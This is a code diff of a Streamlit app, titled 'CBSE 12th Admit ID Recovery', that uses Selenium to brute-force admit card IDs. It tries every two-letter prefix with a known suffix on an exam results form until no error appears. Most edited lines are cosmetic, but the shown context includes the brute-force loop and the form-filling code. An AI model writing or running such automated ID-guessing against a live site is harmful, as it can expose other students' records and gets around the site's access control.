@@ -29,7 +29,7 @@ def get_driver():
     return webdriver.Chrome(options=options)
 
 def is_success(driver):
-    """Your exact logic: Returns True if result is shown (no error)"""
+    """Your logic: Returns True if result is shown (no error)"""
     try:
         # 1. Look for error message
         try:
@@ -56,17 +56,17 @@ def is_success(driver):
 # ========================= STREAMLIT UI =========================
 st.set_page_config(page_title="Admit ID Recovery", page_icon="🎓", layout="centered")
 
-# Custom CSS for a better look
+# Custom CSS for a better look - Fixed parameter name here
 st.markdown("""
     <style>
     .main { background-color: #f5f7f9; }
     .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #ff4b4b; color: white; }
     .stTextInput>div>div>input { border-radius: 5px; }
     </style>
-    """, unsafe_allow_value=True)
+    """, unsafe_allow_html=True)
 
 st.title("🎓 CBSE 12th Admit ID Recovery")
-st.info("This tool automates the recovery of your Admit Card ID by testing alphabetical prefixes.")
+st.info("Automated recovery of Admit Card IDs using alphabetical prefix testing.")
 
 # Input Layout
 col1, col2 = st.columns(2)
@@ -90,7 +90,6 @@ if st.button("🚀 Start Brute Force"):
         combos = [f"{a}{b}" for a in letters for b in letters]
         total = len(combos)
         
-        # We use st.status for a better "live" log look
         with st.status("Initializing...", expanded=True) as status:
             for i, prefix in enumerate(combos):
                 code = f"{prefix}{suffix_val}"
@@ -98,7 +97,7 @@ if st.button("🚀 Start Brute Force"):
                 progress_bar.progress((i + 1) / total)
                 
                 try:
-                    # Clear and fill using your logic
+                    # Clear and fill fields
                     driver.find_element(By.ID, "rroll").clear()
                     driver.find_element(By.ID, "rroll").send_keys(roll_val)
                     
@@ -116,7 +115,7 @@ if st.button("🚀 Start Brute Force"):
                         st.code(code, language="text")
                         break
                         
-                except Exception as e:
+                except Exception:
                     continue 
             else:
                 status.update(label="❌ Finished with no success", state="error")
